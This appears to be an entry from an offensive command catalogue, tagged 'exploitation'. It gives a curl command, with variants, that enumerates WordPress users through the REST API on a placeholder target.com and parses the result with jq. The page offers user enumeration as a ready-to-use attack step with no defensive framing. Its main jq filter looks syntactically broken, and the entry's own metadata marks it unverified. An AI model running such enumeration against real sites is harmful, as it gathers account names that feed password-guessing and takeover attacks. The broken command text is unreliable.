---
id: cmd-curl-rest-api-query
data: >-
  curl -s https://target.com/wp-json/wp/v2/users?per_page=100 | jq '.[].{id:
  .id, name: .name, url: .url}'
tags:
  - exploitation
  - api
  - disclosure
type: command
output: '[{"id":1,"name":"admin","url":"https://target.com"}]'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.940Z'
verified: false
validated: true
submitted: true
---
# curl-rest-api-query

## Command

```bash
curl -s https://target.com/wp-json/wp/v2/users?per_page=100 | jq '.[].{id: .id, name: .name, url: .url}'
```

## Description

Queries the WordPress REST API to enumerate users, exploiting lack of auth in version 4.6.2, and parses output with jq.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| `https://target.com/wp-json/wp/v2/users` | API endpoint | Yes |
| `?per_page=100` | Limit results | No |
| `jq '.[].{id: .id, name: .name, url: .url}'` | Parse specific fields | Yes |

## Examples

### Basic Usage

```bash
curl -s https://target.com/wp-json/wp/v2/users | jq '.[].name'
```

### Advanced Usage

```bash
curl -s https://target.com/wp-json/wp/v2/users?context=edit | jq '.'
```

## Expected Output

JSON array of user objects with IDs, names, and URLs.

## Related

- [[Related Procedure: Exploit-WordPress-REST-API-Info-Disclosure]]
